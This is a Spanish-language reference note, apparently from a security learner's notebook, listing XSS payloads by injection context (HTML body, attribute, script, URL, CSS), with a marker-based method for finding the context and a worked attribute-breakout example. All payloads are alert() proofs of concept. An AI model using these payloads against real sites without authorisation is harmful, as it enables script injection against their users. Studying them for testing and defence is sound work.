---
tipo: meta
aliases:
  - Payloads XSS contexto
  - XSS breakout
tags:
  - meta/referencia
  - dominio/web
---

# XSS contextos - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Dónde cae tu input** decide cómo romper. Es el eje central de XSS: el mismo payload no sirve en todos los contextos. `yi``  ` copia el payload.
>
> Para saber en qué contexto estás: inyectá un marcador único (`zzq123`), buscalo en el HTML de la respuesta y mirá qué lo rodea.

## 0. Identificar el contexto

Inyectá `zzq123"'<>` y buscá el reflejo:

`zzq123` entre `<p>...</p>`  →  **HTML body**.
`zzq123` dentro de `value="..."`  →  **atributo**.
`zzq123` dentro de `<script>var x='...'`  →  **contexto JS**.
`zzq123` dentro de `href="..."`  →  **URL**.
Si `<` y `>` sobreviven sin codificar, podés inyectar tags. Si salen como `&lt;`, no.

## 1. HTML body

El input cae entre tags. Se inyecta un tag nuevo.

`<script>alert(document.domain)</script>`
El clásico. No corre si se inserta vía `innerHTML` (los `<script>` así no ejecutan) — usar los de abajo.

`<img src=x onerror=alert(document.domain)>`
El más portátil: ejecuta por el handler, funciona vía `innerHTML`.

`<svg onload=alert(document.domain)>`
Corto, sin recurso que cargar.

`<body onload=alert(1)>` / `<details open ontoggle=alert(1)>`
Alternativas cuando `img`/`svg` están filtrados.

## 2. Atributo HTML

El input cae dentro de un atributo entre comillas. Primero cerrar la comilla.

`"><script>alert(1)</script>`
Si podés cerrar el atributo Y el tag: salís al body. El caso feliz.

`" onmouseover="alert(1)`
Si NO podés inyectar `<>` (filtrados): cerrás la comilla y agregás un handler al mismo tag. Requiere interacción (mouseover).

`" autofocus onfocus="alert(1)`
Handler que dispara solo, sin interacción — `autofocus` fuerza el foco.

`'-alert(1)-'`
Si el atributo usa comilla simple y es un contexto tipo evento inline.

## 3. Dentro de `<script>`

El input cae dentro de código JS. No hace falta ningún tag: ya estás en JS, solo hay que salir del string o del statement.

`'-alert(1)-'`  /  `";alert(1);//`
Cerrar el string (según la comilla que use la app) y ejecutar. El `//` comenta el resto.

`</script><script>alert(1)</script>`
Cerrar el bloque script entero y abrir uno nuevo — funciona aunque el string esté escapado, porque el parser HTML ve `</script>` antes que el de JS.

`${alert(1)}`
Si el input cae dentro de un template literal (backticks).

## 4. URL (href / src)

El input alimenta una URL. No hace falta romper comillas si controlás el esquema.

`javascript:alert(document.domain)`
En un `href`: al hacer clic ejecuta. También en `<iframe src>`, `window.location`.

`javascript:alert(1)//`  con  `%0a` / `%0d`
Si filtran `:` o insertan saltos, probar codificaciones.

`data:text/html,<script>alert(1)</script>`
Esquema `data:` en `iframe src` — ejecuta en un origen distinto (limita el impacto).

## 5. CSS

El input cae en un `style` o `<style>`. Muy limitado en navegadores modernos.

`</style><img src=x onerror=alert(1)>`
Casi siempre la salida real: cerrar el `<style>` y volver a HTML.

`background:url("javascript:alert(1)")`
Legacy (IE). No corre en navegadores actuales — documentado por completitud.

## Ejemplo — de marcador a ejecución

```
1. ?q=zzq123"'<>              → en el HTML: <input value="zzq123&quot;'&lt;&gt;">
   → contexto atributo; " sale como &quot;  → no puedo cerrar con comilla doble

2. ?q=zzq123' onmouseover='alert(1)   → <input value="zzq123' onmouseover='alert(1)">
   → la comilla SIMPLE no se codifica  → handler inyectado

3. ?q=zzq123' autofocus onfocus='alert(document.domain)
   → ejecuta solo, sin pasar el mouse
```

## Gotchas

| Síntoma | Qué pasa |
|---|---|
| `<script>` inyectado no ejecuta | Se insertó vía `innerHTML` — usar `<img onerror>` / `<svg onload>` |
| `<` sale como `&lt;` | Codifican HTML: no hay inyección de tag, probar contexto atributo/JS |
| El payload aparece pero no corre | Contexto equivocado — reidentificar con el marcador |
| Corre una vez y después no | Probable CSP o el navegador bloqueó — ver [[XSS - CSP]] |

## Relacionadas

[[MOC - Cross-site scripting]] · [[XSS evasión - matriz de referencia]] · [[XSS impacto - matriz de referencia]]
